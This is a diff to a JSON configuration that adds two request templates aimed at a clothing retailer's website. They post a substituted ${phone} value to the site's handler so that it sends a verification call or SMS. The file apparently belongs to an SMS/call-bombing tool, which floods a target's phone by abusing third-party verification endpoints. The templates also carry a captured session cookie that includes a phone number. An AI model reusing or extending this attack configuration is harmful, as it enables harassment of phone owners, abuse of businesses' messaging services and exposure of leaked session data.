@@ -215,6 +215,50 @@
             ],
             "request-type": 1,
             "protocol-type": 1
+        },
+        {
+            "name": "CityStar: Call",
+            "url": "https://citystarwear.com/bitrix/templates/bs-base/php/includes/bs-handlers.php",
+            "payload": "phone=${phone}&bxl=42f034e44ee6fc1a03283334f23cee74&hdlr=bsSendCallCode&key=DOvBhIav34535434v212SEoVINS&dataForm%5Bphone%5D=${phone}&dataForm%5BcallNums%5D=&dataForm%5BsmsCode%5D=&dataForm%5Bemail%5D=&dataForm%5Becode%5D=&KPNyr=99C2k71IQGzOL4yWB592SYwHt&otS0X=cqpxl1Gf5drvRn37mt89vJyN9&yjWZm=7p9sy7VHQjsj2BdBmtWpLiBlP&MiV59=ZodOAM0nv8flkr1Gjvt2kKArj&pF4Lb=PIvbjtDsSNxOFE30cb0JKnvI5&7uE7K=8S73TJKJIpahInX06pwWyxw16&U7yMB=iFcebu3AyYlgTRUxK6XHEz0R6&Bt21g=zQTQNPJQ9gLmXESXF23E1R0Om&q4Xza=6HK1r6Cl5l2I3xkVWNZkRdANu&59xPH=MC9OSgjcOpxhS5fpFELDIO2Hf",
+            "headers": [
+                "Host: citystarwear.com",
+                "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:131.0) Gecko/20100101 Firefox/131.0",
+                "Accept: */*",
+                "Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3",
+                "Content-Type: application/x-www-form-urlencoded; charset=UTF-8",
+                "X-Requested-With: XMLHttpRequest",
+                "Origin: https://citystarwear.com",
+                "Connection: keep-alive",
+                "Referer: https://citystarwear.com/lk/profile/",
+                "Cookie: PHPSESSID=fuQ3kGOqGqFEFWJ5b2k8VsH66BW1MKGH; I_BITRIX2_SM_bsSiteVersionRun=D; _ga_V3X9JZN8LW=GS1.1.1727900773.1.1.1727900776.57.0.0; _ga=GA1.1.490729510.1727900774; bsTracker=13c16a2b9d5a67d8acfcaa63c9ef5baa%7C1727900772; _ym_uid=1727900774773829283; _ym_d=1727900774; _ym_isad=1; _ym_visorc=w; cto_bundle=8ikqsV9UU2tYdnNmb0tjZnYwbWhXT0YwdTBQbWVXWU9SRmVRdGdHUVl2MEpFU2VDUDdJcE1Ua2xpM1UyaEt3SWU2cU05aGtTQm82cTMwSEp6bTFaOU0yU1EyYzN5NnRHT2VWZ29uY0dTcEl1JTJGb0lWM1lPZHlyWHA1SGRmczM2alRHckkyREVSbTRaZGh5UmNXVlk4WnNJYWRhUSUzRCUzRA; faddprodsitems=a2b193ca6830a56f5a236213c824a627; I_BITRIX2_SM_bsAuthPhone=7%239959105265",
+                "Sec-Fetch-Dest: empty",
+                "Sec-Fetch-Mode: cors",
+                "Sec-Fetch-Site: same-origin"
+            ],
+            "request-type": 1,
+            "protocol-type": 1
+        },
+        {
+            "name": "CityStar: SMS",
+            "url": "https://citystarwear.com/bitrix/templates/bs-base/php/includes/bs-handlers.php",
+            "payload": "phone=${phone}&bxl=42f034e44ee6fc1a03283334f23cee74&hdlr=bsSendSMSCode&key=DOvBhIav34535434v212SEoVINS&dataForm%5Bphone%5D=${phone}&dataForm%5BcallNums%5D=&dataForm%5BsmsCode%5D=&dataForm%5Bemail%5D=&dataForm%5Becode%5D=&KPNyr=99C2k71IQGzOL4yWB592SYwHt&otS0X=cqpxl1Gf5drvRn37mt89vJyN9&yjWZm=7p9sy7VHQjsj2BdBmtWpLiBlP&MiV59=ZodOAM0nv8flkr1Gjvt2kKArj&pF4Lb=PIvbjtDsSNxOFE30cb0JKnvI5&7uE7K=8S73TJKJIpahInX06pwWyxw16&U7yMB=iFcebu3AyYlgTRUxK6XHEz0R6&Bt21g=zQTQNPJQ9gLmXESXF23E1R0Om&q4Xza=6HK1r6Cl5l2I3xkVWNZkRdANu&59xPH=MC9OSgjcOpxhS5fpFELDIO2Hf",
+            "headers": [
+                "Host: citystarwear.com",
+                "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:131.0) Gecko/20100101 Firefox/131.0",
+                "Accept: */*",
+                "Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3",
+                "Content-Type: application/x-www-form-urlencoded; charset=UTF-8",
+                "X-Requested-With: XMLHttpRequest",
+                "Origin: https://citystarwear.com",
+                "Connection: keep-alive",
+                "Referer: https://citystarwear.com/lk/profile/",
+                "Cookie: PHPSESSID=fuQ3kGOqGqFEFWJ5b2k8VsH66BW1MKGH; I_BITRIX2_SM_bsSiteVersionRun=D; _ga_V3X9JZN8LW=GS1.1.1727900773.1.1.1727900776.57.0.0; _ga=GA1.1.490729510.1727900774; bsTracker=13c16a2b9d5a67d8acfcaa63c9ef5baa%7C1727900772; _ym_uid=1727900774773829283; _ym_d=1727900774; _ym_isad=1; _ym_visorc=w; cto_bundle=8ikqsV9UU2tYdnNmb0tjZnYwbWhXT0YwdTBQbWVXWU9SRmVRdGdHUVl2MEpFU2VDUDdJcE1Ua2xpM1UyaEt3SWU2cU05aGtTQm82cTMwSEp6bTFaOU0yU1EyYzN5NnRHT2VWZ29uY0dTcEl1JTJGb0lWM1lPZHlyWHA1SGRmczM2alRHckkyREVSbTRaZGh5UmNXVlk4WnNJYWRhUSUzRCUzRA; faddprodsitems=a2b193ca6830a56f5a236213c824a627; I_BITRIX2_SM_bsAuthPhone=7%239959105265",
+                "Sec-Fetch-Dest: empty",
+                "Sec-Fetch-Mode: cors",
+                "Sec-Fetch-Site: same-origin"
+            ],
+            "request-type": 1,
+            "protocol-type": 1
         }
     ]
 }
